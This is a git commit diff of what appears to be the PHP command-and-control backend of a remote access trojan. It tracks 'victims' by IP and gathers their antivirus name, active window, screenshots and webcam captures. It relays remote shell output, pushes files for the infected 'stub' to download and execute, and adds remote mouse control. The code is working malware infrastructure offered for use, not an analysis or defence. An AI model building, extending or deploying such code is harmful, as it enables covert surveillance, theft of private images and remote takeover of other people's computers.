3982628019bb2e0d0cbe51cfa2d6a5460c886bc7
xPythacker <52961795+Flysre@users.noreply.github.com>
2020-04-02 15:17:41 +0200

    Updating clients saving methods
    Now don't remove automatically all victims folder in action=cleanit
    We check for each victim folder (IP) if the folder got updated by action=writeme
    If not folder age in timestamp will be older.If the timestamp of the folder is 5s older than the Actual date. 
    We delete the folder
    This helps optimisation, as sometimes stub won't receive instruction because they will try to read it while the folder isn't written after delete.

--- API/clients.php
+++ API/clients.php
@@ -14,16 +14,15 @@ if (isset($_GET["uptime"])) {$uptime = $_GET["uptime"];}                        
 if (isset($_GET["avname"])) {$avname = $_GET["avname"];}                                     // antivirus detected send in action=writeme
 if (isset($_GET["softwarename"])) {$softwarename = $_GET["softwarename"];}                   // stub name send in action=writeme
 if (isset($_GET["currentwindow"])) {$currentwindow = base64_encode($_GET["currentwindow"]);} // current window victim browse send in action=writeme IN BASE64 to avoid string escape
-if (isset($_GET["target"])) {$target = $_GET["target"];}                                     // TARGET have to be use when sending instruction from pannel
+if (isset($_GET["target"])) {$target = $_GET["target"];}                                     // TARGET have to be use when sending instruction from panel
 if (isset($_GET["actiontype"])) {$actiontype = $_GET["actiontype"];}                         // Actiontype return the action the stub have to do : Start a file)
 if (isset($_GET["actioncontent"])) {$actioncontent = $_GET["actioncontent"];}                // actioncontents declare destails about Actiontype   ^^^^ filename
 if (isset($_GET["actioncontent2"])) {$actioncontent2 = $_GET["actioncontent2"];}             // Even More details about possible actions that need to be transfered
-$actioncontent2 = $_GET["actioncontent2"];                                                   //
 $actioncontent3 = $_GET["actioncontent3"];                                                   //
 $actioncontent4 = $_GET["actioncontent4"];                                                   //
 $actioncontent5 = $_GET["actioncontent5"];                                                   // 
 $victim = $_SERVER['REMOTE_ADDR'];                                                           // victim return page visitor ip (on used occurence the victim IP)  
-$actionid = randomstring(5);                                                                 // actionid is used when sending a message in chatbox(check if message is not the sale)
+$actionid = randomstring(5);                                                                 // actionid is used when sending a message in chatbox(check if message is not the same)
 $date = date("[H:i:s d-m-Y]");                                                               // date is here in case i need it
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -42,26 +41,25 @@ $date = date("[H:i:s d-m-Y]");                                                  
 
 // writeme is used when victim send his status
 if ($action == "writeme") {
-// isdir check if the victim is online (Pannel delete the file every 5 seconds. Writeme will constantly create the folder and deduce this as victim online)
+// When victim browse, it will try to create the if doesn't exist
 // $victim = Refer to line 10
-	if (!is_dir("victims/$victim")) {mkdir("victims/$victim", 0777); chmod("victims/" . $victim, 0777);}
-// When victim browse the url , if an action have been send by the pannel ,it will be returned as string to the stub
-	echo(cache_get($victim . "actions"));
-// After instruction got readed, directly removing it because its perfectly recieved by victim
-	cache_set($victim . "actions" , "");
-// we set in victim . "stats" (= 1.2.3.4stats) the actual stat of the victim that will be returned as json to the pannel
-	cache_set($victim . "stats" , "{\"ip\":\"$victim\",\"ping\":\"$ping\",\"cpu\":\"$cpu\",\"ram\":\"$ram\",\"currentwindow\":\"$currentwindow\",\"uptime\":\"$uptime\",\"softwarename\":\"$softwarename\",\"avname\":\"$avname\"}[;;]");
+if (!is_dir("victims/$victim")) {mkdir("victims/$victim", 0777); chmod("victims/" . $victim, 0777);}
+// Touch will update file creation date (if file already exist = actual user = update last time seen)
+touch("victims/$victim");
+// When victim browse the url , if an action have been send by the panel ,it will be returned to the stub
+echo(cache_get($victim . "actions"));
+// After action got readed, directly removing it because its perfectly recieved by victim
+cache_set($victim . "actions" , "");
+// we set in victim . "stats" (= 1.2.3.4stats) the actual stat of the victim that will be returned as json to the panel
+cache_set($victim . "stats" , "{\"ip\":\"$victim\",\"ping\":\"$ping\",\"cpu\":\"$cpu\",\"ram\":\"$ram\",\"currentwindow\":\"$currentwindow\",\"uptime\":\"$uptime\",\"softwarename\":\"$softwarename\",\"avname\":\"$avname\"}[;;]");
 // If there is not folder $victim then its a new client onlie, and we write files for it
-	if (!is_dir("logs/$victim")) {
-		mkdir("logs/$victim"); chmod("logs/$victim", 0777);
-		mkdir("logs/$victim/screenshots"); chmod("logs/$victim/screenshots", 0777);
-		mkdir("logs/$victim/camerashot"); chmod("logs/$victim/camerashot", 0777);
+if (!is_dir("logs/$victim")) {
+mkdir("logs/$victim"); chmod("logs/$victim", 0777);
+mkdir("logs/$victim/screenshots"); chmod("logs/$victim/screenshots", 0777);
+mkdir("logs/$victim/camerashot"); chmod("logs/$victim/camerashot", 0777);
 // Refer to Line 6 to uptime. 
 // If uptime is superior at TWO then the victim is not new and is online for more than two seconds
-	} else {
-		if ($uptime > 2) { return; }
-	}
-}
+} else {  if ($uptime > 2) { return; }     }    }
 ///////////////////////////////////////////////////////
 
 
@@ -95,7 +93,7 @@ if ($action == "uploadscreenshot") {    $byte = file_get_contents("php://input")
 if ($action == "uploadcamerashot") {    $byte = file_get_contents("php://input");   file_put_contents("logs/$victim/camerashot/$actioncontent.jpeg", $byte);  }
 ///////////////////////////////////////////////////////
 
-// Recieved file by pannel is in files in $actioncontent as file name
+// Recieved file by panel is in files in $actioncontent as file name
 if ($action == "remoteexec") { move_uploaded_file($_FILES["file"]["tmp_name"], "files/$actioncontent");
 
 // Send instruction to victim to download the file & exec it (remotexec directly refer to files folder on server & $actioncontent as file name)
@@ -111,26 +109,37 @@ if ($action == "getshellreply") {     cache_get($target . "shellreply"); cache_s
 ///////////////////////////////////////////////////////
 
 // Used by stub for remote screen and constantly save the file
-if ($action == "uploadimage") {     file_put_contents("victims/$victim/screenshot", file_get_contents("php://input"));     }
+if ($action == "uploadimage") {		file_put_contents("victims/$victim/screenshot", file_get_contents("php://input"));     }
 ///////////////////////////////////////////////////////
 
-// Clean it is send  by pannel every interval to clear the folder (refer line 34)
-// And get stats for the victim
+// Used by Panel to return when screenshare if they have to remote desktop xPos|yPos|ClickType(left , right , double , drag)
+if ($action == "sendcords") {	cache_set($target . "mousecords" , "$actioncontent|$actioncontent2|$actioncontent3|$actioncontent4");}
+///////////////////////////////////////////////////////
 
-if ($action == "cleanit") {
-	$victims = array_diff(scandir('victims/'), array('.', '..'));
-// For each files in victims/ 
-	// (1 File = One IP = One victim) then we get victim . stats (=  1.2.3.4stats) and get the stats refer to line 41
-	foreach($victims as $list){
-		echo (cache_get($list . "stats"));
-	}
+// Coordinates returned when panel enable remote control, then clean because datas succesfully recieved by victim and victim moved mouse
+if ($action == "getcords") {	echo cache_get($victim . "mousecords"); cache_set($victim . "mousecords","");	}
+///////////////////////////////////////////////////////
+
 	
-	
-// We delete the victim file and write it, victims actualy online  will make a writeme (refer to line 34) to be put as Line34
-	exec("rm -r victims");
-	mkdir("victims" , 0777 , true);
-	chmod("victims", 0777);
+// Clean it is send  by panel every interval to clear the folder (refer line 34)
+// And get stats for the victim
+if ($action == "cleanit") {     $victims = array_diff(scandir('victims/'), array('.', '..'));
+// For each files in victims/ (1 File = One IP = One victim) then we get victim . stats (=  1.2.3.4stats)
+// Edited : File is not regulary deleted by PHP, but deleted directly if Folder of the victim didn't got updated at least 5seconds ago
+// When $action=writeme // The script update the last edited file time so restet the "timer" to 5s before file deleted
+// Maybe will put the max uptime to 6
+foreach($victims as $list){
+$dir = stat("victims/$list");
+$olddate =  Time() - 4;
+if ($dir['mtime'] < $olddate) { exec("rm -r victims/$list"); } else {echo (cache_get($list . "stats")); }
+
 }
+
+}
+// We delete the victim file and write it, victims actualy online  will make a writeme (refer to line 34) to be put as Line34
+// exec("rm -r victims"); mkdir("victims" , 0777 , true); chmod("victims", 0777);  
+///////////////////////////////////////////////////////
+
 
 
 
